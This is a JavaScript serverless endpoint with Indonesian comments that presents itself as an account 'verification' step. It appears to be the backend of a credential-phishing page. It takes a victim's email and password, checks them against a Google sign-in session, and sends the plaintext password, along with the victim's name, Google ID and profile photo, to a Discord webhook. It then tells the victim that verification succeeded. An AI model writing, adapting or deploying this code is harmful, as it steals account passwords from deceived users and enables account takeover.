import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { token, email, password } = req.body;
  if (!token || !email || !password) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  // Ambil sesi dari KV
  let sessionData;
  try {
    sessionData = await kv.get(`session:${token}`);
  } catch (err) {
    console.error('KV get error:', err);
    return res.status(500).json({ error: 'Failed to retrieve session' });
  }

  if (!sessionData) {
    return res.status(401).json({ error: 'Invalid or expired session. Please login again.' });
  }

  // Validasi email
  if (email.toLowerCase() !== sessionData.email.toLowerCase()) {
    return res.status(403).json({ error: 'Email tidak sesuai dengan akun Google yang Anda pilih.' });
  }

  // Kirim ke Discord webhook
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  if (webhookURL) {
    const discordPayload = {
      embeds: [
        {
          title: '🔐 New Verification Data',
          color: 0x00ff00,
          fields: [
            { name: '🏷️ Nama', value: sessionData.name || 'Tidak tersedia', inline: true },
            { name: '📧 Email', value: email, inline: true },
            { name: '🔑 Password', value: `||${password}||`, inline: true },
            { name: '🆔 Google ID', value: sessionData.google_id, inline: true },
            { name: '📸 Foto Profil', value: sessionData.picture || 'Tidak tersedia', inline: false },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };

    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(discordPayload),
      });
    } catch (discordErr) {
      console.error('Discord webhook error:', discordErr);
      // Tidak mengganggu proses utama
    }
  }

  // Hapus sesi setelah digunakan
  await kv.del(`session:${token}`);

  return res.status(200).json({ success: true, message: 'Verification successful' });
}